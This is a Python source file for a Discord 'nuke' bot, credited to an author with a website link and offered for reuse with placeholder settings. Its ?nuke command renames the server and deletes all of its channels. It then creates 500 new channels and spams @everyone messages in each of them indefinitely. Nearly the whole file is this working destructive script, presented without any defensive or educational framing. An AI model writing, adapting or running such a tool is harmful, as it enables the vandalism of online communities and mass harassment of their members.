# This was made by Fd_q https://f7.lol

import discord
from discord.ext import commands
import asyncio
import random

TOKEN = 'TOKEN-GOES-HERE'  # Replace with your token.

GUILD_NAME = 'Made By Fd' # Change to a name you want the nuked server to be called

SPAM_MESSAGES = [ # Change the text in brackets to the text you want to spam, You can add more if you need
     "@everyone **Message 1.",
    "@everyone **Message 2.",
    "@everyone **Message 3.",
    "@everyone **Message 4.",
    "@everyone **Message 5.",
    "@everyone **Message 6.",
    "@everyone **Message 7.",
    "@everyone **Message 8."
]

CHANNEL_NAMES = [ # These are the names of the channels which will be created, You can make more if you need.
    "Channel1", "Channel2", "Channel3"
]

# Intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='?', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def nuke(ctx):
    guild = ctx.guild

    try:
        # Rename the server
        await guild.edit(name=GUILD_NAME)
        print(f'Server renamed to: {GUILD_NAME}')
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f'Deleted channel: {channel.name}')
            except Exception as e:
                print(f'Failed to delete {channel.name}: {e}')
            await asyncio.sleep(0)
        created_channels = []
        async def create_channel():
            name = random.choice(CHANNEL_NAMES)
            try:
                channel = await guild.create_text_channel(name)
                print(f"Created channel: {name}")
                created_channels.append(channel)
            except Exception as e:
                print(f"Failed to create {name}: {e}")
        await asyncio.gather(*[create_channel() for _ in range(500)])
        async def spam_channel(channel):
            while True:
                try:
                    await channel.send(random.choice(SPAM_MESSAGES))
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"Error in channel {channel.name}: {e}")
                await asyncio.sleep(0.5)
        tasks = [spam_channel(channel) for channel in created_channels]
        await asyncio.gather(*tasks)

        await ctx.send("Nuke operation started. Spam will continue indefinitely.")

    except Exception as e:
        print(f'Error: {e}')
        await ctx.send("An error occurred during the nuke.")

@bot.command()
async def stop(ctx):
    """Stop the bot."""
    await ctx.send("Shutting down the bot...")
    await bot.close()

bot.run("TOKEN-GOES-HERE") # Bot token goes here again